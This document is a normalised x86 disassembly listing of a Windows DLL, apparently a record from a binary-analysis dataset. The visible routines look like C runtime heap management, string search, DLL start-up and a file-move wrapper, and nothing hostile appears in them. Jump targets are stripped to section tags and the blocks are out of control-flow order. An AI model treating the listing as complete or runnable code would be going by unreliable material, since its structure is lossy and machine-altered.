add esp 0x14
mov eax esi
push eax
push ebx
push [ ebp - 0x24 ]
call sub_10005ed0
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_10005713
add esp 0x18
jmp r-xdata
mov eax esi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x24 ]
call sub_10005ed0
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_10005713
add esp 0x18
mov eax esi
sub_1000440b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x9
call sub_10005bc2
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10004961
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
push esi
push 0x9
call sub_10005bc2
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push esi
call sub_100056bc
add esp 0xc
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_10004475
cmp [ ebp - 0x1c ] 0x0
jmp r-xdata
push esi
push eax
call sub_1000498c
pop ecx
pop ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_100044cd
cmp [ ebp - 0x24 ] 0x0
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x28 ]
call sub_10005713
add esp 0xc
jne r-xdata
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
sub_100044ff
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call [ MoveFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
retn
push eax
call sub_100063d8
pop ecx
or eax 0xffffffff
retn
test eax eax
je r-xdata
sub_1000452d
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push eax
call sub_10006575
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_1000645d
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_10004580
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10004600
mov eax [ esp + 0x8 ]
cmp eax 0x1
jne r-xdata
xor ecx ecx
cmp eax ecx
jne r-xdata
call [ GetVersion@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_10005dc8
test eax eax
pop ecx
je r-xdata
cmp eax 0x3
jne r-xdata
cmp [ rw-data ] ecx
jle r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
xor ecx ecx
mov cl [ rw-data ]
and eax 0xff
shr [ rw-data ] 0x10
mov [ rw-data ] eax
mov [ rw-data ] ecx
shl eax 0x8
add eax ecx
mov [ rw-data ] eax
call sub_10006fca
test eax eax
jne r-xdata
push 0x1
pop eax
push ecx
call sub_100070b6
pop ecx
dec [ rw-data ]
cmp [ rw-data ] ecx
jne r-xdata
retn 0xc
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1000766c
mov [ rw-data ] eax
call sub_10007156
call sub_1000741f
call sub_10007366
call sub_10006eac
inc [ rw-data ]
jmp r-xdata
call sub_10005e25
call sub_10007312
call sub_1000701e
call sub_10005e25
jmp r-xdata
call sub_10006eea
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10004600
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10002320
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10004600
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10004600
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_10004776
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
call sub_1000779e
test eax eax
jne r-xdata
push [ esp + 0x4 ]
call sub_100077d7
push 0xff
call [ rw-data ]
pop ecx
pop ecx
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_100047b0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_100047f1
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_1000481d
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_10005c38
test eax eax
pop ecx
jne r-xdata
sub_1000481d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x9
call sub_10005bc2
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10004cb5
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_10004884
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
add eax 0xf
and al 0xf0
push eax
push 0x1
pop eax
push 0x10
pop esi
lea esi [ eax + 0xf ]
and esi 0xfffffff0
jmp r-xdata
jmp r-xdata
push esi
jmp r-xdata
push 0x9
call sub_10005bc2
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax esi
shr eax 0x4
push eax
call sub_10005758
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_100048e3
mov eax [ ebp - 0x1c ]
test eax eax
jne r-xdata
mov [ ebp + 0x8 ] esi
cmp esi [ rw-data ]
ja r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
sub_10004919
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_10004961
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_1000498c
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ ecx + 0x10 ]
push edi
mov edi esi
add esi 0xfffffffc
sub edi [ ecx + 0xc ]
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ecx + esi ]
lea ebx [ ecx + esi ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov ebx [ ecx + edx * 8 + 0x4 ]
lea ecx [ ecx + edx * 8 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
mov [ ebp - 0x4 ] ecx
sar edx 0x4
dec edx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
cmp edx 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] edi
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
mov esi 0x80000000
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov esi 0x80000000
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_10007930
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_10004cb5
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_1000506f
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_10004fbe
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_10004fbe
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_1000506f
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_1000516a
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
